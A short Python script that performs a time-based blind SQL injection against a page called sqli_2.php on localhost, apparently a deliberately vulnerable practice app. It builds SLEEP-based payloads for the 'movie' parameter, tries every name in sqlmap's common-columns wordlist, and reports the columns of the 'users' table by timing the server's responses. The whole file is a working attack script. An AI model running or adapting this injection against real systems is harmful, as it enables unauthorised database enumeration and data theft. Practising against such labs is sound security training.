# the columns found here are from table called users, you might want to change that in the url
import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sql_injection(s):
    print(f"Columns found:")
    with open("/usr/share/sqlmap/data/txt/common-columns.txt", "r") as columns:
        for column in columns:
            column = column.strip()
            url = f"http://127.0.0.1/sqli_2.php?movie=1+AND+(SELECT+SLEEP(5)+FROM+information_schema.columns+WHERE+table_name%3d'users'+AND+column_name%3d'{column}')&action=go"
            cookies={'security_level':'0','PHPSESSID':'19e9bovm5a71qp7k1ininlusk6'}  #you need to add your specific phpsessid cookie
            response = s.get(url,verify = False,cookies=cookies)
            if response.elapsed.total_seconds() > 2:
                print(f"{column}")
                             
def main():
    s = requests.Session()    
    print("(+) Retreiving columns...")
    sql_injection(s)  

if __name__ == "__main__":
    main()